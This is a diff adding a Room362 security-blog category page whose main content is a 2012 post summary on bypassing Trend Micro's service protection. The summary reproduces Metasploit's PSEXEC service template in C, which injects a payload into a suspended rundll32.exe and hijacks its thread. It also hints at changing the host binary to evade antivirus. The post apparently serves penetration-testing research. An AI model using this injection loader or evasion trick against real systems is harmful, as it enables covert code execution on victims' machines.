@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en-us">
+<head>
+  <title>
+    Trendmicro // Room362
+  </title>
+
+  <link href="http://gmpg.org/xfn/11" rel="profile">
+<meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+
+<meta name="description" content="">
+<meta name="keywords" content="">
+<meta name="author" content="">
+<meta name="generator" content="Hugo 0.16" />
+
+  <meta property="og:title" content="Trendmicro" />
+<meta property="og:description" content="" />
+<meta property="og:type" content="website" />
+<meta property="og:locale" content="en_US" />
+<meta property="og:url" content="https://room362.com/categories/trendmicro/" />
+
+
+  
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.5.0/base-min.css">
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.5.0/pure-min.css">
+  
+  
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.5.0/grids-responsive-min.css">
+  
+  
+
+  <link rel="stylesheet" href="https://room362.com//css/redlounge.css">
+  <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet">
+  <link href='//fonts.googleapis.com/css?family=Raleway:400,200,100,700,300,500,600,800' rel='stylesheet' type='text/css'>
+  <link href='//fonts.googleapis.com/css?family=Libre+Baskerville:400,700,400italic' rel='stylesheet' type='text/css'>
+
+  
+  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/touch-icon-144-precomposed.png">
+  <link rel="shortcut icon" href="/favicon.png">
+
+  
+  <link href="https://room362.com/categories/trendmicro/index.xml" rel="alternate" type="application/rss+xml" title="Room362" />
+
+    
+  
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.7/styles/tomorrow-night-bright.min.css">
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.7/highlight.min.js"></script>
+  <script>hljs.initHighlightingOnLoad();</script>
+
+
+  
+
+  
+
+  
+
+  
+</head>
+
+<body>
+	<div id="layout" class="pure-g">
+    <div class="sidebar pure-u-1 pure-u-md-1-4">
+  <div class="header">
+    
+
+	
+	  <img src="/images/headshot.png" class="sidebarphoto">
+	
+
+    <h1 class="brand-title">Room362</h1>
+    <h2 class="brand-tagline">Blatherings of a security addict</h2>
+
+    <nav class="nav">
+      <ul class="nav-list">
+        <li class="nav-item"><span class="nav-item-separator">//</span><a href="https://room362.com/">Home</a></li>
+        
+          <li class="nav-item"><span class="nav-item-separator">//</span><a href="/brandon/">Brandon</a></li>
+        
+          <li class="nav-item"><span class="nav-item-separator">//</span><a href="/about/">About</a></li>
+        
+      </ul>
+    </nav>
+
+    
+    <div class="social-buttons">
+      
+        
+        <a href="/index.xml" target="_blank"><i class='fa fa-rss'></i></a>
+        
+      
+        
+        <a href="https://linkedin.com/in/mubix" target="_blank"><i class='fa fa-linkedin'></i></a>
+        
+      
+        
+        <a href="https://twitter.com/mubix" target="_blank"><i class='fa fa-twitter'></i></a>
+        
+      
+      
+    </div>
+    
+
+  </div>
+</div>
+
+
+    <div class="content pure-u-1 pure-u-md-3-4">
+      <a name="top"></a>
+      
+
+      <div class="posts">
+        
+          <section  class="post">
+            <header class="post-header">
+            
+            <h1 class="post-title">
+              <a href="/post/2012/2012-07-05-bypassing-trend-micros-service-protection/">Bypassing Trend Micro&#39;s Service Protection</a>
+            </h1>
+            </header>
+            <p class="post-meta">
+            	
+		          <span class="post-date">
+		            <span class="post-date-day"><sup>5</sup></span><span class="post-date-separator">/</span><span class="post-date-month">Jul</span> <span class="post-date-year">2012</span>
+		          </span>
+      				
+      				
+      					By <a class="post-author" >mubix</a>
+      				
+              
+                <span class="post-reading-time"><i class="fa fa-clock-o"></i> <em>3 min. read</em></span>
+              
+      				
+      					<div class="post-categories">
+				        
+      					
+					        <a class="post-category post-category-metasploit" href="https://room362.com//categories/metasploit">metasploit</a>
+      					
+					        <a class="post-category post-category-trendmicro" href="https://room362.com//categories/trendmicro">trendmicro</a>
+      					
+      					</div>
+      				
+            </p>
+            <article class="post-summary">
+            	@jabjorkhaug posed the following question on Twitter today: I figured I could solve this and it would be an interesting challenge. Here is what it gets detected as: The service binary that is used as part of PSEXEC is located here: MSF Directory/data/templates/src/pe/exe/service/service.c The important part to look at starts at line 57: #define WIN32_LEAN_AND_MEAN #include &lt;windows.h&gt; #define PAYLOAD_SIZE 8192 char cServiceName[32] = &quot;SERVICENAME&quot;; char bPayload[PAYLOAD_SIZE] = &quot;PAYLOAD:&quot;; SERVICE_STATUS ss; SERVICE_STATUS_HANDLE hStatus = NULL; /* * */ BOOL ServiceHandler( DWORD dwControl ) { if( dwControl == SERVICE_CONTROL_STOP || dwControl == SERVICE_CONTROL_SHUTDOWN ) { ss.dwWin32ExitCode = 0; ss.dwCurrentState = SERVICE_STOPPED; } return SetServiceStatus( hStatus, &amp;ss ); } /* * */ VOID ServiceMain( DWORD dwNumServicesArgs, LPSTR * lpServiceArgVectors ) { CONTEXT Context; STARTUPINFO si; PROCESS_INFORMATION pi; LPVOID lpPayload = NULL; ZeroMemory( &amp;ss, sizeof(SERVICE_STATUS) ); ZeroMemory( &amp;si, sizeof(STARTUPINFO) ); ZeroMemory( &amp;pi, sizeof(PROCESS_INFORMATION) ); si.cb = sizeof(STARTUPINFO); ss.dwServiceType = SERVICE_WIN32_SHARE_PROCESS; ss.dwCurrentState = SERVICE_START_PENDING; ss.dwControlsAccepted = SERVICE_ACCEPT_STOP|SERVICE_ACCEPT_SHUTDOWN; hStatus = RegisterServiceCtrlHandler( (LPCSTR)&amp;cServiceName, (LPHANDLER_FUNCTION)ServiceHandler ); if ( hStatus ) { ss.dwCurrentState = SERVICE_RUNNING; SetServiceStatus( hStatus, &amp;ss ); if( CreateProcess( NULL, &quot;rundll32.exe&quot;, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &amp;si, &amp;pi ) ) { Context.ContextFlags = CONTEXT_FULL; GetThreadContext( pi.hThread, &amp;Context ); lpPayload = VirtualAllocEx( pi.hProcess, NULL, PAYLOAD_SIZE, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE ); if( lpPayload ) { WriteProcessMemory( pi.hProcess, lpPayload, &amp;bPayload, PAYLOAD_SIZE, NULL ); #ifdef _WIN64 Context.Rip = (DWORD64)lpPayload; #else Context.Eip = (DWORD)lpPayload; #endif SetThreadContext( pi.hThread, &amp;Context ); } ResumeThread( pi.hThread ); CloseHandle( pi.hThread ); CloseHandle( pi.hProcess ); } ServiceHandler( SERVICE_CONTROL_STOP ); ExitProcess( 0 ); } } /* * */ int __stdcall WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow ) { SERVICE_TABLE_ENTRY st[] = { { (LPSTR)&amp;cServiceName, (LPSERVICE_MAIN_FUNCTIONA)&amp;ServiceMain }, { NULL, NULL } }; return StartServiceCtrlDispatcher( (SERVICE_TABLE_ENTRY *)&amp;st ); } It&rsquo;s injecting our payload into the service binary and tossing our payload into &ldquo;rundll32.exe&rdquo; at run time on the victim (side note: you can change which bin it goes into ;).
+            </article>
+			<div class="read-more-link">
+				<a href="/post/2012/2012-07-05-bypassing-trend-micros-service-protection/"><span class="read-more-slashes">//</span>Read More...</a>
+			</div>
+          </section>
+        
+      </div>
+
+      <div class="footer">
+	<hr class="thin" />
+	<div class="pure-menu pure-menu-horizontal pure-menu-open">
+		<ul class="footer-menu">
+		
+			<li><a href="/about">About</a></li>
+		
+			<li><a href="/post">Blog</a></li>
+		
+		</ul>
+	</div>
+
+	<p>&copy; 2016. All rights reserved.</p>
+</div>
+    </div>
+  </div>
+  
+</body>
+</html>
